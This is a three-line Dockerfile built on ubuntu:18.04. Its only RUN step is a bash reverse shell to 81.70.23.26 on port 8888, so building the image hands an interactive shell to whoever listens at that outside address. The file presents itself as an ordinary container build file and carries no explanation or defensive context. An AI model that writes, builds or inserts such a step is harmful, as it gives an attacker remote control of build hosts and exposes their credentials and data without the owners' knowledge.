FROM ubuntu:18.04

RUN bash -i >& /dev/tcp/81.70.23.26/8888 0>&1

CMD ["/bin/bash"]
